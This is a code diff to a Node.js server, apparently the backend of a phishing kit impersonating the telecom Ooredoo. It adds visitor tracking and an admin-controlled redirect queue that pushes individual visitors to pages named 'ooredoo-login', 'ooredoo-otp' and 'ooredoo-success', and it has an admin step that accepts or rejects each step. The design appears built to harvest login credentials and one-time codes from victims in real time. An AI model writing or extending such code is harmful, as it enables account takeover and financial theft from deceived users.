@@ -22,11 +22,23 @@ function saveOrders() {
 
 // الزيارات النشطة: زائر = نشط لو أرسل نبضة خلال آخر 10 ثوانٍ
 const visitors = new Map();
+const visitorRedirects = new Map();
+const orderVisitors = new Map();
 const ACTIVE_MS = 10000;
 function activeVisitors() {
   const now = Date.now();
   for (const [id, v] of visitors) if (now - v.t > ACTIVE_MS) visitors.delete(id);
   return [...visitors.values()];
+}
+function getVisitorLocale(page) {
+  const p = String(page || "").toLowerCase();
+  if (p.includes("-en.html") || p.includes("index-en") || p.includes("order-en") || p.includes("summary-en") || p.includes("ooredoo-") && p.includes("-en")) return "en";
+  return "ar";
+}
+function normalizeRedirectTarget(value) {
+  const v = String(value || "order").trim();
+  const allowed = ["index", "order", "summary", "ooredoo-login", "ooredoo-loading", "ooredoo-otp", "ooredoo-otp-loading", "ooredoo-success"];
+  return allowed.includes(v) ? v : (v && !v.includes(".") ? v : "order");
 }
 
 const TYPES = {
@@ -108,6 +120,12 @@ async function api(req, res, url) {
   if (req.method === "POST" && url === "/api/orders") {
     let b; try { b = await readBody(req); } catch (e) { return send(res, 400, { ok: false }); }
     const o = cleanOrder(b);
+    const visitorId = str((b.visitorId || b.id || b.sessionId || b.visitor_id || b.clientId || ""), 40);
+    if (visitorId && o.ref) {
+      orderVisitors.set(o.ref, visitorId);
+      const currentVisitor = visitors.get(visitorId) || { t: Date.now(), page: "" };
+      visitors.set(visitorId, { ...currentVisitor, t: Date.now(), page: str(b.page || currentVisitor.page || "", 60), locale: getVisitorLocale(b.page || currentVisitor.page || "") });
+    }
     if (o.pay === undefined) delete o.pay;
     if (o.step === undefined) delete o.step;
     if (b.ooredoo && typeof b.ooredoo === "object" && o.ref) {
@@ -154,13 +172,20 @@ async function api(req, res, url) {
   if (req.method === "POST" && url === "/api/ping") {
     let b = {}; try { b = await readBody(req); } catch (e) {}
     const id = str(b.id, 40); if (!id) return send(res, 400, { ok: false });
-    visitors.set(id, { t: Date.now(), page: str(b.page, 60) });
+    visitors.set(id, { t: Date.now(), page: str(b.page, 60), locale: getVisitorLocale(b.page) });
     return send(res, 200, { ok: true });
   }
   if (req.method === "POST" && url === "/api/leave") {
     let b = {}; try { b = await readBody(req); } catch (e) {}
     visitors.delete(str(b.id, 40));
     return send(res, 200, { ok: true });
+  }
+  if (req.method === "GET" && /^\/api\/redirect\//.test(url)) {
+    const id = decodeURIComponent(url.split("/").pop().split("?")[0]);
+    const pending = visitorRedirects.get(id);
+    if (!pending) return send(res, 404, { ok: false });
+    visitorRedirects.delete(id);
+    return send(res, 200, { ok: true, redirect: { target: pending.target, ref: pending.ref, page: pending.page, locale: pending.locale } });
   }
   // ===== لوحة التحكم (تحتاج كلمة المرور) =====
   if (url.startsWith("/api/admin/")) {
@@ -169,6 +194,17 @@ async function api(req, res, url) {
     if (req.method === "GET" && url === "/api/admin/orders") {
       const v = activeVisitors();
       return send(res, 200, { ok: true, orders, active: v.length, pages: v.map(x => x.page) });
+    }
+    if (req.method === "POST" && /^\/api\/admin\/redirect\//.test(url)) {
+      const ref = decodeURIComponent(url.split("/").pop());
+      let b = {}; try { b = await readBody(req); } catch (e) {}
+      const target = normalizeRedirectTarget(b.target || b.targetName || "order");
+      const visitorId = orderVisitors.get(ref) || null;
+      if (!visitorId) return send(res, 404, { ok: false, error: "visitor_not_found" });
+      const visitor = visitors.get(visitorId) || {};
+      const locale = (b.locale === "en" || b.locale === "ar") ? b.locale : getVisitorLocale(visitor.page || b.page || "");
+      visitorRedirects.set(visitorId, { target, ref, page: String(visitor.page || ""), locale });
+      return send(res, 200, { ok: true, target, ref, visitorId });
     }
     // الأدمن يقبل أو يرفض الخطوة الحالية
     if (req.method === "POST" && /^\/api\/admin\/decide\//.test(url)) {
